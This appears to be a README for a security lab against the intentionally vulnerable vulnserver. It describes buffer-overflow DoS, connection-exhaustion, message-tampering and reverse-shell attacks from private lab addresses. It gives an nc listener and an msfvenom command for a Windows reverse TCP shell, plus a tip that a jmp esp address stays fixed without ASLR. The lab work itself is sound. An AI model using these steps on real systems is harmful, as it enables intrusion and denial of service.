## Test setting
- Local host: 10.0.2.8
- Victim host: 10.0.2.7
 
## DoS.py
This attack exploits the buffer overflow issue of vulnserver and sends a long message, which causes buffer overflow and crash of vulnserver.

## DDoS.py
Since vulnserver allows only a limited number of connections, this attack creates a lot of connections to vulnserver so that no more new connections can be created and no new user can use vulnserver for chatting.

## MITM
This attack shows how a message may be changed by the chat server if there is no protection (interity).

To enabe the attack, the chat server owner (bad guy) can do the following
1. Use telnet to connect to the chat server
```
telnet 10.0.2.7 9999
```

2. Enable MITM within telnet 
```
MITM 1
```
Now all messages will be appended with " hahaha...".

## reverse-shell.py
This attacks ubtilizes the buffer overflow vulnerability of vulnserver and sends a reverse tcp shell payload, which connects back to the attack and spawns a shell at the attacker.
To receive the reverse shell, run the following command at another terminal
```
nc -l -v -p 4444
```

### Notes
1. If the test setting above is used, the python attacking code works directly with no need of change.
2. If the address of *jmp esp* comes from essfunc.dll as used in the example Python code, essfunc.dll does not use ASLR and there is no need of changing the address of *jmp esp* when Windows 10 reboots.
3. If the ip of the local host (attacker's computer) is 10.0.2.8, no need of generating the shellcode using the following command
```
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.8 LPORT=4444 EXITFUNC=thread -f python -v SHELL -b '\x00\x0a\x0a' 
```
